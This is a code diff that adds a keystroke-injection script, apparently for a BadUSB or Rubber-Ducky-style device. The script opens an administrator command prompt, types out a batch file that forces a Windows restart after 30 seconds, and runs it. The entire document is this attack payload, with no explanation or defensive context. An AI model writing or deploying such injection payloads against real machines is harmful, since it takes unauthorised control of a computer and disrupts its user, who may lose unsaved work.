@@ -1,0 +1,21 @@
+Delay 1000
+RunCmdAdmin
+Delay 3000
+Keyboard.println("copy con Shutdown.bat");
+Delay 3000
+PrintLine @echo off
+Delay 3000
+PrintLine shutdown /r /t 30
+Delay 3000
+Press KEY_LEFT_CTRL
+Print z
+Delay 100
+Release
+Delay 2000
+PressRelease KEY_ENTER
+Delay 3000
+PrintLine Shutdown.bat
+Delay 2000
+PressRelease KEY_ENTER
+Delay 3000
+PrintLine exit
